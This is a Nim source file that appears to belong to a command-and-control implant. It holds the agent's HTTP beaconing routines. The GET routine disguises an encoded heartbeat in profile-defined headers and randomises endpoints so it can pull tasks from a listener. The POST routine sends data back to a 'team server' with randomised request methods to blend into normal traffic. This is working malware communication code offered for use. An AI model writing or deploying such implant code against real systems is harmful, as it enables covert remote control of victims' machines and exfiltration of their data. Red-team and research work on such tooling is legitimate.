import httpclient, json, strformat, strutils, asyncdispatch, base64, tables, parsetoml, random

import ../../common/[types, utils, profile]
import sugar
proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string = 

    let client = newAsyncHttpClient(userAgent = ctx.profile.getString("agent.user-agent"))
    var heartbeatString: string

    # Apply data transformation to the heartbeat bytes
    case ctx.profile.getString("http-get.agent.heartbeat.encoding.type", default = "none")
    of "base64":
        heartbeatString = encode(heartbeat, safe = ctx.profile.getBool("http-get.agent.heartbeat.encoding.url-safe")).replace("=", "")
    of "none": 
        heartbeatString = Bytes.toString(heartbeat)
    
    let prefix = ctx.profile.getString("http-get.agent.heartbeat.prefix")
    let suffix = ctx.profile.getString("http-get.agent.heartbeat.suffix")

    let payload = prefix & heartbeatString & suffix

    # Add heartbeat packet to the request
    case ctx.profile.getString("http-get.agent.heartbeat.placement.type"): 
    of "header": 
        client.headers.add(ctx.profile.getString("http-get.agent.heartbeat.placement.name"), payload)
    of "parameter":
        discard 
    of "uri":
        discard
    of "body": 
        discard
    else:
        discard 

    # Define request headers, as defined in profile
    for header, value in ctx.profile.getTable("http-get.agent.headers"): 
        client.headers.add(header, value.getStringValue())

    # Define additional request parameters
    var params = ""
    for param, value in ctx.profile.getTable("http-get.agent.parameters"): 
        params &= fmt"&{param}={value.getStringValue()}"
    params[0] = '?'

    # Select a random endpoint to make the request to
    var endpoint = ctx.profile.getArray("http-get.endpoints").getRandom().getStringValue()
    if endpoint[0] == '/': 
        endpoint = endpoint[1..^1]

    try:
        # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
        return waitFor client.getContent(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint}{params}")
    
    except CatchableError as err:
        # When the listener is not reachable, don't kill the application, but check in at the next time
        echo "[-] " & err.msg 
    
    finally:
        client.close()

    return ""

proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} = 
    
    let client = newAsyncHttpClient(userAgent = ctx.profile.getString("agent.user-agent"))

    # Define request headers, as defined in profile
    for header, value in ctx.profile.getTable("http-post.agent.headers"): 
        client.headers.add(header, value.getStringValue())
    
    # Select a random endpoint to make the request to
    var endpoint = ctx.profile.getArray("http-post.endpoints").getRandom().getStringValue()
    if endpoint[0] == '/': 
        endpoint = endpoint[1..^1]
    
    let requestMethod = parseEnum[HttpMethod](ctx.profile.getArray("http-post.request-methods").getRandom().getStringValue("POST"))

    let body = Bytes.toString(data)

    try:
        # Send post request to team server
        discard waitFor client.request(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint}", requestMethod, body)
    
    except CatchableError as err:
        echo "[-] " & err.msg 
        return false
    
    finally:
        client.close()

    return true